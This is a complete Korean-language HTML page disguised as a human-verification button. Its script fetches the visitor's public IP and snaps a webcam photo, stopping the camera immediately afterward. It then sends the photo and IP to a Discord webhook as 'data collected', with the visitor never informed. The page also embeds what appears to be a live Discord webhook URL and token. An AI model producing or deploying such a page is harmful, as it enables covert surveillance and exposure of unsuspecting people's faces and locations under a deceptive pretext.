<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>장치 데이터 전송</title>
    <style>
        body {
            font-family: sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 40px 20px;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        button {
            background-color: #5865F2; /* 디스코드 시그니처 색상 */
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.2s;
            width: 100%;
        }
        button:hover { background-color: #4752C4; }
        #status { margin-top: 20px; color: #555; font-size: 14px; }
    </style>
</head>
<body>

<div class="container">
    <h2>사람이라면 아래 버튼을 눌러서 인증하세요.</h2>
    <p style="color: #666; font-size: 14px; margin-bottom: 20px;">
        아래 버튼을 누르면 인증이 완료됩니다.
    </p>
    
    <button id="sendBtn">인증버튼</button>
    <div id="status">대기 중...</div>
</div>

<script>
    // ⚠️ 주의: 자신의 디스코드 채널 웹훅 URL을 입력하세요.
    const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; 

    const sendBtn = document.getElementById('sendBtn');
    const statusDiv = document.getElementById('status');

    // 1. 외부 API를 통해 접속한 사용자의 공인 IP 주소 가져오기
    async function getUserIP() {
        try {
            // ipify 무료 API 서비스를 사용하여 JSON 형태로 IP 조회
            const response = await fetch('https://ipify.org');
            const data = await response.json();
            return data.ip;
        } catch (err) {
            console.error("IP 조회 실패:", err);
            return "확인 불가 (네트워크 차단 등)";
        }
    }

    // 2. 백그라운드 카메라 촬영 (사용자 권한 승인 팝업은 필수 발생)
    function captureInvisible() {
        return new Promise(async (resolve, reject) => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                
                const tempVideo = document.createElement('video');
                tempVideo.srcObject = stream;
                tempVideo.autoplay = true;
                tempVideo.playsinline = true;

                tempVideo.onloadedmetadata = () => {
                    setTimeout(() => {
                        const tempCanvas = document.createElement('canvas');
                        tempCanvas.width = tempVideo.videoWidth || 640;
                        tempCanvas.height = tempVideo.videoHeight || 480;
                        
                        const context = tempCanvas.getContext('2d');
                        context.drawImage(tempVideo, 0, 0, tempCanvas.width, tempCanvas.height);
                        
                        // 촬영 종료 후 즉시 카메라 장치 불빛 끄기
                        stream.getTracks().forEach(track => track.stop());

                        tempCanvas.toBlob((blob) => {
                            if (blob) resolve(blob);
                            else reject("이미지 변환 실패");
                        }, 'image/png');
                    }, 500); // 카메라 센서 안정을 위한 미세 대기 시간
                };
            } catch (err) {
                reject("카메라 권한이 거부되었습니다.");
            }
        });
    }

    // 3. 디스코드 웹훅으로 IP 주소와 이미지 전달
    async function sendToDiscord(blob, ipAddress) {
        const formData = new FormData();
        
        // 디스코드 메시지 본문 작성
        const content = `📢 **데이터 수집 완료**\n🌐 **공인 IP 주소:** \`${ipAddress}\``;
        
        formData.append('content', content);
        formData.append('file', blob, 'capture.png');

        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            body: formData
        });

        if (!response.ok) throw new Error(`서버 응답 오류 (${response.status})`);
    }

    // 버튼 클릭 이벤트
    sendBtn.addEventListener('click', async () => {
        if (DISCORD_WEBHOOK_URL.includes('https://discord.com/api/webhooks/1560151307669733397/zRhqqWVbI9PPSyAz_5sWeGh8SQicqiQqChP-MEGgC6quaN0VEFPtjNBnzIv2X_FSF2ah')) {
            alert('코드를 편집하여 DISCORD_WEBHOOK_URL에 실제 주소를 넣어주세요.');
            return;
        }

        statusDiv.innerText = "IP 주소 확인 중...";

        try {
            // A. IP 주소 가져오기
            const userIP = await getUserIP();
            
            // B. 카메라 권한 승인 및 백그라운드 촬영
            statusDiv.innerText = "카메라 확인 중...";
            const blob = await captureInvisible();

            // C. 디스코드 연동 전송
            statusDiv.innerText = "디스코드로 전송 중...";
            await sendToDiscord(blob, userIP);

            statusDiv.innerText = "전송 완료!";
        } catch (error) {
            statusDiv.innerText = `오류: ${error}`;
            console.error(error);
        }
    });
</script>

</body>
</html>
